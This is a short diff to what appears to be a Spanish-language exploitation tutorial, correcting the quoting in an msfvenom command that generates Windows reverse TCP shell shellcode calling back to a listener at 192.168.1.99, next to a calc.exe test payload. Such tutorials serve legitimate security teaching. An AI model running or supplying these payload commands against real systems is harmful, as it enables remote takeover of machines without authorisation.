@@ -187,7 +187,7 @@ msfvenom -a x86 -p windows/exec CMD=calc.exe -f c -b '\x00'
 Aunque también se podrá generar una shell reversa por TCP y de esta manera tomar control de la máquina:
 
 ```bash
-msfvenom -a x86 -p windows/shell/reverse_tcp LHOST=192.168.1.99 LPORT=9001 -f c -b '\x00 EXITFUNC=thread'
+msfvenom -a x86 -p windows/shell/reverse_tcp LHOST=192.168.1.99 LPORT=9001 -f c -b '\x00' EXITFUNC=thread
 ```
 > Se utiliza la opción EXITFUNC=thread, esto significa que el código de shell se generará como un hilo remoto en lugar de generar desde el flujo de código original, evitando que el programa se bloquee al finalizar la ejecución.
 
